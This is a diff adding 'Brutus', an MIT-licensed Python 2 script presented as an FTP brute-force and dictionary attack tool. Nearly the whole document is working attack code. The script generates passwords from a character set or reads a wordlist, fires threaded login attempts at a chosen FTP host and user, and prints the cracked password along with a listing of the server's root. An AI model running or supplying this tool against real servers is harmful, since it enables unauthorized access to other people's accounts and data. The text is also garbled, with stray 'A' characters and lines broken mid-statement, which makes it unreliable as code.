@@ -1,0 +1,194 @@
+################################################################################
+# A  A tool: Brutus - FTP Brute-Force/Dictionary Attack Tool
+# version: 0.3
+# A  email: mrh at bushisecurity dot com
+# A  A  www: bushisecurity.com/brutus/
+################################################################################
+# MIT License
+
+# Copyright (c) 2017 Phillip Aaron
+
+# Permission is hereby granted, free of charge, to any person obtaining
+a copy
+# of this software and associated documentation files (the "Software"),
+to deal#A 
+# in the Software without restriction, including without limitation the
+rights#A 
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or
+sell#A 
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+
+# The above copyright notice and this permission notice shall be
+included in all
+# copies or substantial portions of the Software.
+
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT
+SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
+ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
+IN THE
+# SOFTWARE.
+
+importA argparse,A sys,A threading,A time
+fromA datetimeA importA datetime
+fromA itertoolsA importA chain,A product
+fromA ftplibA importA FTP
+
+# Create some global variables
+classA glob:
+A  A A pwdA =A FalseA # Used for stopping attack when password found
+A  A  chrsetA =A ""A # Character set for brute-force
+A  A  prefixA =A ""A # Prefix string
+A  A  postfixA =A ""A # Postfix string
+A  A  lengthA =A 8A # Default lenth of password
+A  A  minlengthA =A 5A # Default min length of password
+A  A  thrdsA =A 10A # Defualt num of threads
+A  A  verbA =A FalseA # Default value for verbose output
+A  A  pauseA =A 0.01A # Default throttle time, 1 = one second
+A  A  cntA =A 0A # Counting number of attempts
+
+# Iterable Method for brute-forcing a character set and length
+defA bruteforce(charset,A maxlength,A minlength):
+A  A A returnA (''.join(candidate)
+A  A  A  A A forA candidateA inA chain.from_iterable(product(charset,A repeat=i)
+A  A  A  A A forA iA inA range(minlength,A maxlength +A 1)))
+
+# Method for making ftp connections
+defA crack(host,A user,A pwd):
+A  A A try:
+A  A  A  A A ifA glob.verb:A # Check for verbose output
+A  A  A  A  A  A A printA "["A +A str(glob.cnt)A +A "] Trying: "A +A pwd.strip()
+A  A  A  A  ftpA =A FTP(host)A # Create FTP object
+A  A  A  A A ifA ftp.loginA (user,A pwd):A # Check if true
+A  A  A  A  A  A A printA "\nPassword for "A +A userA +A ": "A +A pwd.strip()
+A  A  A  A  A  A A printA "=================================================="
+A  A  A  A  A  A A glob.pwdA =A TrueA # Set global value
+A  A  A  A  A  A A printA ftp.dir()A # Display contents of root FTP
+A  A  A  A  A  A  ftp.quit()A # Disconnect from FTPA 
+A  A A exceptA ExceptionA asA err:
+A  A  A  A A passA # Ignore errors
+
+# Method wait for threads to complete
+defA wait(threads):
+A  A A forA threadA inA threads:A thread.join()A A 
+
+# Method for staging attack
+defA main(args):
+A  A A try:
+A  A  A  A  startA =A datetime.now()A # Time attack started
+A  A  A  A A printA "\nAttacking FTP user ["A + args.usernameA +A "] at ["A +
+args.hostA +A "]"
+A  A  A  A A printA "=================================================="
+A  A  A  A  thrdCnt A =A 0;threadsA =A []A # Local variables
+A  A  A  A A # Set global variables
+A  A  A  A A ifA args.pause:glob.pauseA =A float(args.pause)
+A  A  A  A A ifA args.verbose:glob.verbA =A True
+A  A  A  A A ifA args.threads:glob.thrdsA =A int(args.threads)
+A  A  A  A A ifA args.length:glob.lengthA =A int(args.length)
+A  A  A  A A ifA args.minlength:glob.minlengthA =A int(args.minlength)
+A  A  A  A A ifA args.charset:glob.chrsetA =A args.charset
+A  A  A  A A ifA args.prefix:glob.prefixA =A args.prefix
+A  A  A  A A ifA args.postfix:glob.postfixA =A args.postfix
+A  A  A  A A ifA args.charsetA ==A None:A 
+A  A  A  A  A  A A # Create charset from printable ascii range
+A  A  A  A  A  A A forA charA inA range(37,127):glob.chrsetA +=A chr(char)
+A  A  A  A A # Brute force attack
+A  A  A  A A ifA args.wordlistA ==A None:
+A  A  A  A  A 
+A A forA pwdA inA bruteforce(glob.chrset,A int(glob.length),int(glob.minlength)):A #
+Launch brute-force
+A  A  A  A  A  A  A  A A ifA glob.pwd:A breakA # Stop if password found
+A  A  A  A  A  A  A  A A ifA thrdCnt A !=A args.threads:A # Create threads until
+args.threads
+A  A  A  A  A  A  A  A  A  A A ifA args.prefix:
+A  A  A  A  A  A  A  A  A  A  A  A A pwdA =A str(args.prefix)A +A pwd
+A  A  A  A  A  A  A  A  A  A A ifA args.postfix:
+A  A  A  A  A  A  A  A  A  A  A  A A pwdA +=A str(args.postfix)
+A  A  A  A  A  A  A  A  A 
+A A threadA =A threading.Thread(target=crack,A args=(args.host,args.username,pwd,))
+A  A  A  A  A  A  A  A  A  A A thread.start()
+A  A  A  A  A  A  A  A  A  A  threads.append(thread)
+A  A  A  A  A  A  A  A  A  A  thrdCnt +=A 1;glob.cnt+=1
+A  A  A  A  A  A  A  A  A  A A time.sleep(glob.pause)A # Set pause time
+A  A  A  A  A  A  A  A A else:A # Wait for threads to complete A  A 
+A  A  A  A  A  A  A  A  A  A  wait(threads)
+A  A  A  A  A  A  A  A  A  A  thrdCnt A =A 0
+A  A  A  A  A  A  A  A  A  A  threadsA =A []
+A  A  A  A A # Dictionary attack
+A  A  A  A A else:
+A  A  A  A  A  A A withA open(args.wordlist)A asA fle:A # Open wordlist
+A  A  A  A  A  A  A  A A forA pwdA inA fle:A # Loop through passwords
+A  A  A  A  A  A  A  A  A  A A ifA glob.pwd:A breakA # Stop if password found
+A  A  A  A  A  A  A  A  A  A A ifA thrdCnt A !=A args.threads:A # Create threads until
+args.threads
+A  A  A  A  A  A  A  A  A  A  A 
+A A threadA =A threading.Thread(target=crack,A args=(args.host,args.username,pwd,))
+A  A  A  A  A  A  A  A  A  A  A  A A thread.start()
+A  A  A  A  A  A  A  A  A  A  A  A  threads.append(thread)
+A  A  A  A  A  A  A  A  A  A  A  A  thrdCnt +=1;glob.cnt+=1
+A  A  A  A  A  A  A  A  A  A  A  A A time.sleep(glob.pause)A # Set pause time
+A  A  A  A  A  A  A  A  A  A A else:
+A  A  A  A  A  A  A  A  A  A  A  A  wait(threads)A # Wait for threads to complete
+A  A  A  A  A  A  A  A  A  A  A  A  thrdCnt A =A 0
+A  A  A  A  A  A  A  A  A  A  A  A  threadsA =A []
+A  A A exceptA KeyboardInterrupt:
+A  A  A  A A printA "\nUser Cancelled Attack, stopping remaining threads....."
+A  A  A  A  wait(threads)A # Wait for threads to complete
+A  A  A  A A sys.exit(0)A # Kill app
+A  A  wait(threads)A # Wait for threads to complete
+A  A  stopA =A datetime.now()
+A  A A printA "=================================================="
+A  A A printA "Attack Duration: "A +A str(stop - start)
+A  A A printA "Attempts: "A +A str(glob.cnt)A +A "\n"
+
+ifA __name__A ==A "__main__":
+A  A A # Declare an argparse variable to handle application command line
+arguments
+A  A A parserA =A argparse.ArgumentParser()
+A  A A parser.add_argument("host",A action="store",A help="FTP host")
+A  A A parser.add_argument("username",A action="store",A help="username to
+crack")
+A 
+A A parser.add_argument("-w",A "--wordlist",A action="store",A help="wordlist
+of passwords")
+A 
+A A parser.add_argument("-c",A "--charset",A action="store",A help="character
+set for brute-force")
+A  A A parser.add_argument("-l",A "--length",A action="store",A help="password
+length for brute-force",A 
+A  A  A  A  nargs='?',A default=8,A const=8,A type=int)
+A  A A parser.add_argument("-m","--minlength",A action="store",A 
+A  A  A  A  nargs='?',A default=1,A const=1,A help="Minimum password
+length",A type=int)
+A  A A parser.add_argument("-r","--prefix",A action="store",A help="prefix
+each password for brute-force")
+A  A A parser.add_argument("-o","--postfix",A action="store",A help="postfix
+each password for brute-force")
+A  A A parser.add_argument("-p",A "--pause",A action="store",A help="pause
+time between launching threads",A 
+A  A  A  A  nargs='?',A default=0.01,A const=0.01)
+A  A A parser.add_argument("-t",A "--threads",A action="store",A help="num of
+threads",A 
+A  A  A  A  nargs='?',A default=10,A const=10,A type=int)
+A  A A parser.add_argument("-v",A "--verbose",A action="store",A help="verbose
+output",A 
+A  A  A  A  nargs='?',A default=False,A const=True)
+A  A A # Show help if required arg not included
+A  A A ifA len(sys.argv[1:])==0:
+A  A  A  A A parser.print_help()A A  A  A  A 
+A  A  A  A A parser.exit()
+A  A  argsA =A parser.parse_args()
+A  A A ifA args.minlengthA !=A NoneA orA args.lengthA !=A None:
+A  A  A  A A ifA args.minlengthA >A args.length:
+A  A  A  A  A  A A printA "\n** Argument Logic Error **"
+A  A  A  A  A  A A printA "Minimum password length [-m "+str(args.minlength)+"]
+is greater than Password length [-l "+str(args.length)+"]\n"
+A  A  A  A  A  A A parser.print_help()A A  A  A  A 
+A  A  A  A  A  A A parser.exit()
+A  A  main(args)
+
